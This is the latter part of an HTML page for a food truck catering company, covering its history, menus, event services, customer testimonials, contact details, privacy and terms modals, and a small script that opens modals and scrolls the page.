                    <h4>2019 - Regional Recognition</h4>
                    <p>Our commitment to excellence earned us recognition as the most requested food truck service in the tri-county area. We began partnering with major event organizers and corporate clients, establishing long-term relationships that continue today. This year also marked our first appearance at the State Food Festival, where we served over 5,000 guests in a single weekend.</p>
                </div>
                <div class="timelineitem5k9m">
                    <h4>2021 - Innovation and Growth</h4>
                    <p>Despite challenging times, we adapted by implementing contactless ordering systems and enhanced safety protocols. We also launched our catering coordination service, helping clients plan entire events around our mobile dining experiences. Our fleet grew to six trucks, each with specialized menus developed by professional chefs.</p>
                </div>
                <div class="timelineitem5k9m">
                    <h4>2023 - Present Day</h4>
                    <p>Today, LinkiqHome operates a fleet of eight fully-equipped food trucks serving communities across the region. We've served over 200,000 meals and participated in more than 1,500 events. Our team has grown to include 35 dedicated staff members, from experienced chefs to logistics coordinators, all committed to delivering exceptional mobile dining experiences.</p>
                </div>
            </div>
        </div>
    </section>

    <section id="cuisine8n3p" class="section4r8t">
        <h2 class="sectiontitle2m9k">Cuisine Specialties</h2>
        <div class="infogrid2n8k">
            <div class="infobox4m7p">
                <h4>Mediterranean Flavors</h4>
                <p>Our Mediterranean offerings include fresh falafel wraps, grilled kebabs, and authentic hummus preparations. We source ingredients directly from specialty importers to ensure authentic taste profiles. Each dish is prepared using traditional cooking methods adapted for mobile service.</p>
            </div>
            <div class="infobox4m7p">
                <h4>Southern Comfort</h4>
                <p>Experience traditional Southern cooking with our fried chicken, mac and cheese, and collard greens. These recipes come from generations of home cooking, now available at your event. We use cast iron cookware and time-honored techniques to achieve authentic flavors.</p>
            </div>
            <div class="infobox4m7p">
                <h4>Vegetarian Options</h4>
                <p>Every truck in our fleet offers substantial vegetarian selections. From veggie burgers to plant-based tacos, we ensure all guests have delicious options. Our chefs continuously develop new meat-free recipes that satisfy even dedicated carnivores.</p>
            </div>
            <div class="infobox4m7p">
                <h4>Seafood Selections</h4>
                <p>Fresh fish tacos, shrimp po'boys, and grilled salmon are among our popular seafood offerings. We partner with sustainable fisheries and receive deliveries multiple times weekly to guarantee freshness. Our seafood truck features specialized refrigeration to maintain optimal quality.</p>
            </div>
            <div class="infobox4m7p">
                <h4>Breakfast Service</h4>
                <p>Start your morning events right with our breakfast truck featuring made-to-order omelets, breakfast burritos, and fresh pastries. We serve premium coffee and offer both hearty and light morning options to fuel your day.</p>
            </div>
            <div class="infobox4m7p">
                <h4>International Street Food</h4>
                <p>Explore global flavors with dishes inspired by street food traditions from around the world. From Vietnamese banh mi to Greek gyros, our international menu brings authentic tastes to your location. Each recipe is researched and tested to ensure cultural authenticity.</p>
            </div>
        </div>
    </section>

    <section id="events5m7k" class="section4r8t">
        <h2 class="sectiontitle2m9k">Event Coordination</h2>
        <div class="grid3col5n7p">
            <div class="card9x2m">
                <h3>Wedding Receptions</h3>
                <p>Create a unique dining experience for your special day with our wedding catering services. We work closely with couples to design custom menus that reflect their tastes and accommodate guest preferences. Our trucks can be decorated to match your wedding theme, and we coordinate timing with your event schedule to ensure seamless service during cocktail hour or reception.</p>
            </div>
            <div class="card9x2m">
                <h3>Community Gatherings</h3>
                <p>From neighborhood block parties to charity fundraisers, we provide affordable catering solutions for community events. Our experience with large crowds ensures efficient service, and we can accommodate various budget levels. We often participate in local events at reduced rates to support community initiatives and bring people together through food.</p>
            </div>
            <div class="card9x2m">
                <h3>Sports Events</h3>
                <p>Keep fans fed and happy at sporting events with our high-volume service capabilities. We've catered everything from youth soccer tournaments to adult league championships. Our menu includes crowd-pleasing favorites that can be prepared quickly, ensuring minimal wait times even during peak periods between games.</p>
                <a href="#contact9k3m" class="ctabtn8k3x" style="font-size: 0.9rem; padding: 10px 25px; margin-top: 15px;">Click Here to Continue</a>
            </div>
        </div>
    </section>

    <section id="about2n8k" class="section4r8t">
        <h2 class="sectiontitle2m9k">Why Choose LinkiqHome</h2>
        <div class="history7m3k">
            <p style="font-size: 1.1rem; margin-bottom: 20px;">LinkiqHome Food Trucks has built its reputation on reliability, quality, and customer satisfaction. Our approach to mobile catering goes beyond simply serving food – we create memorable dining experiences that enhance your events.</p>
            
            <h3 style="color: #667eea; margin: 30px 0 15px;">Professional Standards</h3>
            <p>Every member of our team undergoes extensive training in food safety, customer service, and efficient operations. Our trucks are inspected regularly and maintain all required health certifications. We carry comprehensive insurance and follow strict protocols to ensure safe food handling at every event.</p>
            
            <h3 style="color: #667eea; margin: 30px 0 15px;">Flexible Solutions</h3>
            <p>We understand that every event is unique, which is why we offer customizable packages tailored to your specific needs. Whether you need one truck for an intimate gathering or multiple trucks for a large festival, we have the resources and experience to deliver. Our booking process is straightforward, and we work with your timeline and budget constraints.</p>
            
            <h3 style="color: #667eea; margin: 30px 0 15px;">Quality Ingredients</h3>
            <p>We source ingredients from local farms and trusted suppliers whenever possible. Our commitment to quality means we never compromise on freshness or taste. Each truck maintains relationships with specialty vendors to ensure authentic ingredients for their respective cuisines. We also accommodate dietary restrictions and allergies with advance notice.</p>
            
            <h3 style="color: #667eea; margin: 30px 0 15px;">Environmental Responsibility</h3>
            <p>LinkiqHome is committed to sustainable practices in our operations. We use biodegradable serving materials, implement waste reduction strategies, and maintain fuel-efficient vehicles. Our trucks are equipped with water conservation systems, and we partner with local composting services to minimize our environmental impact.</p>
        </div>
    </section>

    <section id="testimonials6p4n" class="reviews6p2n">
        <div class="section4r8t">
            <h2 class="sectiontitle2m9k">Customer Experiences</h2>
            <div class="reviewgrid3m8k">
                <div class="reviewcard7n2p">
                    <div class="reviewheader4k7m">
                        <div class="reviewerimg9n3k">JM</div>
                        <div>
                            <strong>Jennifer Morrison</strong>
                            <div class="stars5m8p">★★★★★</div>
                        </div>
                    </div>
                    <p>We hired LinkiqHome for our company picnic and couldn't have been happier. The taco truck was a huge hit with everyone. The staff was professional, the food was delicious, and they handled our group of 150 people without any issues. Highly recommend for corporate events.</p>
                </div>
                <div class="reviewcard7n2p">
                    <div class="reviewheader4k7m">
                        <div class="reviewerimg9n3k">RK</div>
                        <div>
                            <strong>Robert Kellerman</strong>
                            <div class="stars5m8p">★★★★★</div>
                        </div>
                    </div>
                    <p>Booked the BBQ truck for my daughter's graduation party. The ribs were fall-off-the-bone tender and the sides were just as good as the main dishes. They arrived on time, set up quickly, and the presentation was fantastic. Our guests are still talking about it weeks later.</p>
                </div>
                <div class="reviewcard7n2p">
                    <div class="reviewheader4k7m">
                        <div class="reviewerimg9n3k">SC</div>
                        <div>
                            <strong>Sandra Chen</strong>
                            <div class="stars5m8p">★★★★★</div>
                        </div>
                    </div>
                    <p>The Asian Fusion truck catered our wedding reception and it was perfect. They worked with us to create a custom menu that included vegetarian options for several guests. The food was restaurant quality and the mobile setup added a fun, unique element to our celebration.</p>
                </div>
                <div class="reviewcard7n2p">
                    <div class="reviewheader4k7m">
                        <div class="reviewerimg9n3k">DW</div>
                        <div>
                            <strong>David Whitmore</strong>
                            <div class="stars5m8p">★★★★★</div>
                        </div>
                    </div>
                    <p>Used LinkiqHome for our neighborhood festival and they were outstanding. We had three different trucks which gave attendees great variety. The coordination was seamless and they handled the large crowd efficiently. Will definitely book them again for next year's event.</p>
                </div>
                <div class="reviewcard7n2p">
                    <div class="reviewheader4k7m">
                        <div class="reviewerimg9n3k">MR</div>
                        <div>
                            <strong>Michelle Rodriguez</strong>
                            <div class="stars5m8p">★★★★★</div>
                        </div>
                    </div>
                    <p>The pizza truck came to our son's birthday party and it was a hit with kids and adults alike. Watching them make fresh pizzas in the wood-fired oven was entertainment in itself. The quality was exceptional and they accommodated all the different topping requests from the children.</p>
                </div>
                <div class="reviewcard7n2p">
                    <div class="reviewheader4k7m">
                        <div class="reviewerimg9n3k">TH</div>
                        <div>
                            <strong>Thomas Hendricks</strong>
                            <div class="stars5m8p">★★★★★</div>
                        </div>
                    </div>
                    <p>Fantastic service from start to finish. The booking process was easy, communication was excellent, and the food exceeded expectations. We had the burger truck at our company's annual meeting and received nothing but compliments. The gourmet options were creative and delicious.</p>
                </div>
                <div class="reviewcard7n2p">
                    <div class="reviewheader4k7m">
                        <div class="reviewerimg9n3k">LB</div>
                        <div>
                            <strong>Lisa Beaumont</strong>
                            <div class="stars5m8p">★★★★★</div>
                        </div>
                    </div>
                    <p>We've used LinkiqHome multiple times for different events and they never disappoint. Their reliability and consistency are remarkable. The staff is always friendly and professional, and the food quality remains high regardless of which truck we book. They're our go-to for any catering needs.</p>
                </div>
                <div class="reviewcard7n2p">
                    <div class="reviewheader4k7m">
                        <div class="reviewerimg9n3k">KP</div>
                        <div>
                            <strong>Kevin Patterson</strong>
                            <div class="stars5m8p">★★★★★</div>
                        </div>
                    </div>
                    <p>The dessert truck was the perfect addition to our outdoor wedding. The variety of sweet treats gave guests something special to enjoy throughout the evening. The staff was accommodating and kept everything stocked despite the large crowd. Great value and exceptional service.</p>
                </div>
            </div>
        </div>
    </section>

    <section id="contact9k3m" class="section4r8t">
        <h2 class="sectiontitle2m9k">Get In Touch</h2>
        <div class="history7m3k">
            <div class="infogrid2n8k">
                <div class="infobox4m7p">
                    <h4>Booking Information</h4>
                    <p>Ready to book our services for your next event? Contact us today to discuss your needs and receive a customized quote. We recommend booking at least 3-4 weeks in advance for optimal truck availability, though we can sometimes accommodate last-minute requests depending on our schedule.</p>
                    <p style="margin-top: 15px;"><a href="#contact9k3m" style="color: #667eea; font-weight: bold;">Click here to continue</a> with your booking inquiry.</p>
                </div>
                <div class="infobox4m7p">
                    <h4>Service Areas</h4>
                    <p>We proudly serve the entire metropolitan region and surrounding counties. Our trucks can travel to most locations within a 75-mile radius of our central kitchen. For events outside this area, please contact us to discuss travel arrangements and any additional fees that may apply.</p>
                </div>
                <div class="infobox4m7p">
                    <h4>Operating Hours</h4>
                    <p>Our booking office is open Monday through Friday, 9:00 AM to 6:00 PM, and Saturday from 10:00 AM to 4:00 PM. Our trucks operate seven days a week and can accommodate events at various times, including early morning breakfast services and late evening gatherings.</p>
                </div>
                <div class="infobox4m7p">
                    <h4>Special Requests</h4>
                    <p>We welcome special menu requests and dietary accommodations. Whether you need gluten-free options, vegan selections, or specific cultural dishes, our chefs work to fulfill your requirements. Discuss your needs during the booking consultation for the best results.</p>
                </div>
            </div>
        </div>
    </section>

    <footer class="footer8k4n">
        <div class="footercontent3n7m">
            <div class="footersection5k2p">
                <h3>LinkiqHome Food Trucks</h3>
                <p>Delivering exceptional mobile dining experiences since 2015. Our commitment to quality, service, and customer satisfaction sets us apart in the food truck industry.</p>
            </div>
            <div class="footersection5k2p">
                <h3>Contact Information</h3>
                <p><strong>Phone:</strong> <a href="tel:+15558742390" class="phonenumber6n2k">+1 (555) 874-2390</a></p>
                <p><strong>Email:</strong> bookings@linkiqhome-trucks.com</p>
                <p><strong>Address:</strong> 2847 Riverside Commerce Park, Suite 190, Meadowbrook, State 45829</p>
            </div>
            <div class="footersection5k2p">
                <h3>Quick Links</h3>
                <a href="#services3m8p">Our Services</a>
                <a href="#fleet7n2k">Fleet Information</a>
                <a href="#events5m7k">Event Planning</a>
                <a href="#testimonials6p4n">Customer Reviews</a>
                <a href="javascript:void(0)" onclick="openModal('privacy')">Privacy Policy</a>
                <a href="javascript:void(0)" onclick="openModal('terms')">Terms of Service</a>
            </div>
            <div class="footersection5k2p">
                <h3>Business Hours</h3>
                <p><strong>Office:</strong></p>
                <p>Monday - Friday: 9:00 AM - 6:00 PM</p>
                <p>Saturday: 10:00 AM - 4:00 PM</p>
                <p>Sunday: Closed</p>
                <p style="margin-top: 15px;"><strong>Truck Service:</strong> 7 Days a Week</p>
            </div>
        </div>
        <div class="copyright9m3k">
            <p>&copy; 2024 LinkiqHome Food Trucks. All rights reserved. Operating under health permit #FT-2847-MBK</p>
        </div>
    </footer>

    <div id="privacyModal" class="modal7n4k">
        <div class="modalcontent8m2p">
            <span class="closemodal5k9n" onclick="closeModal('privacy')">&times;</span>
            <h2>Privacy Policy</h2>
            <p><strong>Last Updated: January 2024</strong></p>
            
            <h3>Information Collection</h3>
            <p>LinkiqHome Food Trucks collects information necessary to provide our mobile catering services. This includes contact details such as name, phone number, email address, and event location when you book our services. We also collect event-specific information including date, expected guest count, menu preferences, and any special dietary requirements.</p>
            
            <h3>Use of Information</h3>
            <p>The information we collect is used exclusively for fulfilling your catering requests and improving our services. We use contact information to communicate about bookings, confirm event details, and provide updates about our services. Event information helps us prepare appropriate quantities and ensure we meet your specific needs.</p>
            
            <h3>Information Sharing</h3>
            <p>We do not sell, trade, or rent your personal information to third parties. Information may be shared with our staff members only as necessary to fulfill your service requests. We may share information with vendors or suppliers only when required to complete your order, such as specialty ingredient sourcing.</p>
            
            <h3>Data Security</h3>
            <p>LinkiqHome implements reasonable security measures to protect your personal information from unauthorized access, alteration, or disclosure. We maintain physical, electronic, and procedural safeguards to protect the information we collect. However, no method of transmission over the internet is completely secure.</p>
            
            <h3>Communication Preferences</h3>
            <p>When you book our services, you may receive communications related to your event and occasional updates about our offerings. You can opt out of promotional communications at any time by contacting us directly. Service-related communications regarding your specific booking will still be sent as necessary.</p>
            
            <h3>Cookie Usage</h3>
            <p>Our website may use cookies to enhance user experience and analyze site traffic. These cookies do not collect personally identifiable information unless you provide it voluntarily. You can configure your browser to refuse cookies, though this may limit some website functionality.</p>
            
            <h3>Children's Privacy</h3>
            <p>Our services are not directed to individuals under the age of 18. We do not knowingly collect personal information from children. If we become aware that we have collected information from a child, we will take steps to delete such information promptly.</p>
            
            <h3>Policy Changes</h3>
            <p>LinkiqHome reserves the right to modify this privacy policy at any time. Changes will be posted on this page with an updated revision date. Continued use of our services after changes constitutes acceptance of the modified policy.</p>
            
            <h3>Contact Us</h3>
            <p>For questions about this privacy policy or our data practices, contact us at: <a href="tel:+15558742390">+1 (555) 874-2390</a> or email privacy@linkiqhome-trucks.com</p>
        </div>
    </div>

    <div id="termsModal" class="modal7n4k">
        <div class="modalcontent8m2p">
            <span class="closemodal5k9n" onclick="closeModal('terms')">&times;</span>
            <h2>Terms of Service</h2>
            <p><strong>Last Updated: January 2024</strong></p>
            
            <h3>Service Agreement</h3>
            <p>By booking LinkiqHome Food Trucks services, you agree to these terms and conditions. These terms constitute a binding agreement between you (the client) and LinkiqHome Food Trucks (the service provider). Please read these terms carefully before confirming your booking.</p>
            
            <h3>Booking and Reservations</h3>
            <p>All bookings must be made through our official channels and confirmed in writing. A deposit of 25% is required to secure your reservation, with the balance due 48 hours before the event. Bookings are considered confirmed only after deposit receipt and written confirmation from our team.</p>
            
            <h3>Cancellation Policy</h3>
            <p>Cancellations made more than 14 days before the event date will receive a full refund minus a 10% processing fee. Cancellations made 7-14 days before the event will receive a 50% refund. Cancellations made less than 7 days before the event are non-refundable. We reserve the right to cancel services due to weather, equipment failure, or other circumstances beyond our control, in which case a full refund will be provided.</p>
            
            <h3>Event Requirements</h3>
            <p>Clients must provide adequate space for truck parking and operation, typically requiring a minimum of 30 feet by 12 feet of level ground. Access to standard electrical outlets (when specified) and proximity to the serving area is necessary. Clients are responsible for obtaining any required permits for food service at their venue.</p>
            
            <h3>Menu and Service</h3>
            <p>Menus are subject to ingredient availability and may require substitutions with comparable items. Final guest counts must be provided 72 hours before the event. We will prepare for the confirmed number plus 10% buffer. Significant increases in guest count may not be accommodated without advance notice.</p>
            
            <h3>Liability</h3>
            <p>LinkiqHome Food Trucks maintains comprehensive liability insurance and follows all health and safety regulations. We are not responsible for injuries or damages resulting from client negligence, venue conditions, or circumstances beyond our control. Clients agree to indemnify LinkiqHome against claims arising from their event.</p>
            
            <h3>Payment Terms</h3>
            <p>Payment can be made via credit card, check, or electronic transfer. All prices are quoted in US dollars and are subject to applicable taxes. Additional fees may apply for services outside our standard service area, extended service hours, or special equipment requirements.</p>
            
            <h3>Food Safety</h3>
            <p>We adhere to all local health department regulations and maintain current food service permits. While we take precautions to accommodate dietary restrictions and allergies when notified in advance, clients with severe allergies should exercise caution as our kitchens handle multiple ingredients.</p>
            
            <h3>Intellectual Property</h3>
            <p>All content on our website and marketing materials, including logos, images, and text, is the property of LinkiqHome Food Trucks and protected by copyright laws. Unauthorized use of our intellectual property is prohibited.</p>
            
            <h3>Dispute Resolution</h3>
            <p>Any disputes arising from these terms or our services will be resolved through good faith negotiation. If negotiation fails, disputes will be subject to binding arbitration in accordance with local arbitration rules.</p>
            
            <h3>Modifications</h3>
            <p>LinkiqHome reserves the right to modify these terms at any time. Clients will be notified of significant changes, and continued use of our services constitutes acceptance of modified terms.</p>
            
            <h3>Contact Information</h3>
            <p>For questions regarding these terms, contact us at: <a href="tel:+15558742390">+1 (555) 874-2390</a> or email legal@linkiqhome-trucks.com</p>
        </div>
    </div>

    <script>
        function openModal(type) {
            if(type === 'privacy') {
                document.getElementById('privacyModal').style.display = 'block';
            } else if(type === 'terms') {
                document.getElementById('termsModal').style.display = 'block';
            }
        }
        
        function closeModal(type) {
            if(type === 'privacy') {
                document.getElementById('privacyModal').style.display = 'none';
            } else if(type === 'terms') {
                document.getElementById('termsModal').style.display = 'none';
            }
        }
        
        window.onclick = function(event) {
            if(event.target.classList.contains('modal7n4k')) {
                event.target.style.display = 'none';
            }
        }
        
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function(e) {
                e.preventDefault();
                const target = document.querySelector(this.getAttribute('href'));
                if(target) {
                    target.scrollIntoView({
                        behavior: 'smooth',
                        block: 'start'
                    });
                }
            });
        });
    </script>

    <a href="/" alt="stats counter free" target="_blank" >
<img  src="https://sstatic1.histats.com/0.gif?4977134&101" alt="stats counter free" border="0">
        
</body>
</html>












